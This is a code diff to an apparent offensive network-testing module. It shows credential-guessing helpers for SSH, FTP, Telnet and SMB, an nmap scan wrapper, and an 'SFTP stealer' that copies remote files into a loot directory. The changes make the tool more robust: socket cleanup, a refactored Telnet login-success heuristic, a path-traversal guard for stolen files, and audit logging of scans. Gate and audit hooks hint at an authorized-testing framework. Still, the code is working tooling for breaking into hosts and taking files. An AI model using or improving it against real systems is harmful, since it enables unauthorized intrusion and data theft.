@@ -95,14 +95,35 @@ def _ssh_try(host, port, user, pwd, timeout):
 
 def _ftp_try(host, port, user, pwd, timeout):
     import ftplib  # stdlib
+    ftp = ftplib.FTP()
     try:
-        ftp = ftplib.FTP()
         ftp.connect(host, port, timeout=timeout)
         ftp.login(user, pwd)
         ftp.quit()
         return True
     except Exception:
         return False
+    finally:
+        try:
+            ftp.close()
+        except Exception:
+            pass
+
+
+def _telnet_success(resp: bytes) -> bool:
+    """Decide whether a telnet response looks like a successful login.
+
+    WARNING: This heuristic is fragile. A non-empty response containing a
+    '$'-like prompt that lacks obvious failure keywords is treated as success.
+    False positives are possible (e.g. a server that echoes '$' in an error
+    banner). Positive results MUST be manually verified before acting on them.
+    """
+    if len(resp) <= 4:
+        return False
+    low = resp.lower()
+    return (b"incorrect" not in low
+            and b"failed" not in low
+            and b"login:" not in low)
 
 
 def _telnet_try(host, port, user, pwd, timeout):
@@ -110,6 +131,9 @@ def _telnet_try(host, port, user, pwd, timeout):
     import socket
     try:
         s = socket.create_connection((host, port), timeout=timeout)
+    except Exception:
+        return False
+    try:
         s.settimeout(timeout)
 
         def _read_until(token: bytes) -> bytes:
@@ -129,11 +153,14 @@ def _telnet_try(host, port, user, pwd, timeout):
         _read_until(b"password:")
         s.sendall(pwd.encode() + b"\r\n")
         resp = _read_until(b"$")  # crude: a shell prompt suggests success
-        s.close()
-        low = resp.lower()
-        return b"incorrect" not in low and b"failed" not in low and b"login:" not in low
+        return _telnet_success(resp)
     except Exception:
         return False
+    finally:
+        try:
+            s.close()
+        except Exception:
+            pass
 
 
 def _smb_try(host, port, user, pwd, timeout):
@@ -206,6 +233,20 @@ def _nmap_scan(host, ports, timeout):
 # SFTP stealer
 # ---------------------------------------------------------------------------
 
+def _loot_path(out_dir, host: str, remote_path: str):
+    """Compute a safe local destination for a stolen file.
+
+    Returns a resolved Path inside *out_dir*, or None if the computed path
+    would escape the loot directory (path-traversal guard).
+    """
+    from pathlib import Path
+    base = Path(out_dir).resolve()
+    candidate = (base / (host.replace(".", "_") + "_" + Path(remote_path).name)).resolve()
+    if not str(candidate).startswith(str(base)):
+        return None
+    return candidate
+
+
 def _sftp_get(host, port, user, pwd, remote_paths, out_dir, timeout):
     import paramiko  # lazy
     from pathlib import Path
@@ -216,7 +257,9 @@ def _sftp_get(host, port, user, pwd, remote_paths, out_dir, timeout):
         t.connect(username=user, password=pwd)
         sftp = paramiko.SFTPClient.from_transport(t)
         for rp in remote_paths:
-            local = Path(out_dir) / (host.replace(".", "_") + "_" + Path(rp).name)
+            local = _loot_path(out_dir, host, rp)
+            if local is None:
+                continue  # refuse to write outside the loot dir
             sftp.get(rp, str(local))
             got.append(rp)
     finally:
@@ -285,6 +328,8 @@ class NetworkOffense:
                               detail=f"would nmap {host} ports {ports}")
         runner = self._scanner or _nmap_scan
         open_ports = runner(host, ports, timeout)
+        self.gate.audit({"tier": "A", "action": "scan", "target": host,
+                         "allowed": True, "reason": f"{len(open_ports)} open ports"})
         return ScanResult(True, why, host, open_ports,
                           detail=f"{len(open_ports)} open")
 
